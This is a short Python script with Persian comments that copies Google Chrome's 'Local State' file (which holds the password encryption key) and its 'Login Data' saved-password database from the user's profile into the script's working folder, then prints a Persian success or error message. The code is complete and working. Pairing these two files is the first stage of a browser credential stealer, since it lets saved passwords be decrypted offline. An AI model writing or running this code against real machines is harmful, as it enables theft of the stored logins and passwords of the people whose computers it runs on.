import os
import shutil

# مسیر پیش‌فرض Chrome
chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default")

# مسیر فایل‌های مورد نظر
local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
login_data_path = os.path.join(chrome_path, "Login Data")

# مسیر مقصد (همان جایی که اسکریپت اجرا می‌شود)
destination_folder = os.getcwd()  # مسیر فعلی

try:
    # کپی فایل‌ها در مسیر اسکریپت
    shutil.copy(local_state_path, os.path.join(destination_folder, "Local State"))
    shutil.copy(login_data_path, os.path.join(destination_folder, "Login Data"))
    print(f"✅ فایل‌ها با موفقیت در مسیر {destination_folder} کپی شدند.")
except Exception as e:
    print(f"❌ خطا در کپی کردن فایل‌ها: {e}")
